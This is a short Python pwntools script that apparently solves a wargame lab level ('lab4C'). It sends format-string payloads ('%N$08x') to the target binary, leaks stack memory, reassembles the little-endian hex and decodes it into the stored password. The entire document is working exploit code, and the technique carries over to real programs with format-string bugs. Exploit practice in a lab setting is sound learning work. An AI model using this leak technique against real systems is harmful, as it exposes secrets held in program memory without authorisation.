import pwn
 
prv_out = ''
rv = ''
for i in range(1, 40, 10):
  prv_out = rv
  p = pwn.process("/levels/lab04/lab4C")
  line = ""
  for j in range(10):
    line += "%"+str(i+j)+"$08x "
 
  p.sendline(line)
  p.sendline("pass")
  rv = p.recv(2000)
  print(rv)


my_bytes = prv_out.splitlines()[-1][72:89]
out = rv.splitlines()[-1]
my_bytes += out[0:53]
my_bytes = ''.join(my_bytes.split())
print(my_bytes)

passwd = ''
# little endian sucks!
for i in range(0, len(my_bytes), 8):
  passwd += my_bytes[i+6:i+8] + my_bytes[i+4:i+6] + my_bytes[i+2:i+4] + my_bytes[i:i+2]

print(passwd)
print(passwd.decode('hex'))

